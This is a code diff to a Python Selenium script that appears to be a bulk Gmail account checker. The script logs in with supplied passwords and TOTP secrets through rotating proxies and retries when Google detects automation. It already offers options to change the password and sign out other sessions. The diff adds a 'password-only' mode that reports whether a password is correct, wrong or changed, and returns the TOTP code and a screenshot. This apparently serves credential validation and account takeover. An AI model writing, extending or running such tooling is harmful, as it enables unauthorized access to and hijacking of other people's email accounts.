@@ -548,14 +548,76 @@ def next_fresh_totp(
     return code
 
 
+def password_stop_verdict(url: str, text: str) -> dict:
+    """Stop at the password page: sahi, changed, or wrong."""
+    low = (text or "").lower()
+    href = (url or "").lower()
+    changed_bits = (
+        "password was changed",
+        "password has been changed",
+        "password has changed",
+        "you changed your password",
+        "changed your password",
+        "changed the password",
+        "password changed",
+    )
+    wrong_bits = (
+        "wrong password",
+        "didn't recognize",
+        "that password is incorrect",
+        "incorrect password",
+        "password you entered",
+    )
+    if any(bit in low for bit in changed_bits):
+        return {
+            "status": "password_changed",
+            "reason": "Password changed",
+            "category": "not_open",
+        }
+    if any(bit in low for bit in wrong_bits) or "wrongpassword" in href:
+        return {
+            "status": "wrong_password",
+            "reason": "Password wrong",
+            "category": "not_open",
+        }
+    kind = challenge_kind(url)
+    on_password = "challenge/pwd" in href or kind == "pwd"
+    accepted = (
+        not on_password
+        and (
+            kind in {"dp", "totp", "ipp", "selection", "skotp", "ootp", "sms", "pk", "kpe", "ipe"}
+            or signed_in_host(url)
+            or "myaccount.google.com" in href
+            or "mail.google.com" in href
+            or is_totp_challenge_url(url)
+            or "might not be safe" in low
+            or "2-step verification" in low
+            or "check your phone" in low
+            or "verify it's you" in low
+            or "verify that it's you" in low
+        )
+    )
+    if accepted:
+        return {
+            "status": "password_ok",
+            "reason": "Password sahi",
+            "category": "open",
+        }
+    return {
+        "status": "unknown",
+        "reason": "Password page did not say sahi, changed, or wrong",
+        "category": "unknown",
+    }
+
+
 def browser_result_category(result: dict) -> str:
     """Return the stable UI category for a browser-check result."""
     status = result.get("status", "")
-    if status == "opened":
+    if status in ("opened", "password_ok"):
         return "open"
 
     # wrong_password and 2fa_required are definitive negative signals — not_open
-    if status in ("wrong_password", "2fa_required"):
+    if status in ("wrong_password", "password_changed", "2fa_required"):
         return "not_open"
 
     if status != "verification_required":
@@ -4615,6 +4677,10 @@ def main():
     change_password   = bool(data.get("changePasswordAfterLogin", False))
     sign_out_sessions = bool(data.get("signOutSessions", False))
     robot_check_only  = bool(data.get("robotCheckOnly", False))
+    password_only     = bool(data.get("passwordOnly", False))
+    if password_only:
+        change_password = False
+        sign_out_sessions = False
     raw_device_index  = data.get("deviceIndex")
     device_index      = (
         int(raw_device_index)
@@ -4627,7 +4693,7 @@ def main():
     result = check_gmail(
         email, password, totp_secret, proxy, fresh_profile,
         proxy_for_ip_check, device_index, change_password,
-        sign_out_sessions, robot_check_only,
+        sign_out_sessions, robot_check_only, password_only,
     )
 
     # Auto-retry up to 3 times if Google blocked automation detection.
@@ -4675,6 +4741,7 @@ def main():
         result = check_gmail(
             email, password, totp_secret, _retry_proxy, True,
             proxy_for_ip_check, device_index, change_password,
+            sign_out_sessions, robot_check_only, password_only,
         )
         _blocked_reason = result.get("reason", "")
 
@@ -4900,6 +4967,7 @@ def check_gmail(
     change_password_after_login: bool = False,
     sign_out_sessions: bool = False,
     robot_check_only: bool = False,
+    password_only: bool = False,
 ) -> dict:
     totp_code = generate_totp(totp_secret) if totp_secret else None
     proxy = _proxy_without_unsupported_sticky(proxy)
@@ -5353,6 +5421,7 @@ def check_gmail(
             sign_out_sessions,
             robot_check_only,
             proxy_url=proxy_for_ip_check or proxy,
+            password_only=password_only,
         )
 
         # ── Post-login geo fallback (driver still open here!) ──────────────────
@@ -5478,6 +5547,7 @@ def _do_login(
     sign_out_sessions: bool = False,
     robot_check_only: bool = False,
     proxy_url: str | None = None,
+    password_only: bool = False,
 ) -> dict:
     from selenium.webdriver.common.by import By
     from selenium.webdriver.common.keys import Keys
@@ -8583,6 +8653,13 @@ def _do_login(
     snap("After password")
     tmark("password step done")
     _log_login_timing_summary()
+
+    if password_only:
+        verdict = password_stop_verdict(url, text)
+        verdict["totpCode"] = totp_code
+        verdict["debugScreenshot"] = screenshot_b64()
+        log(f"{email} — password-only stop: {verdict['reason']}")
+        return verdict
 
     # ── Quick wrong-password check (before anything else) ─────────────────────
     if any(x in text for x in [
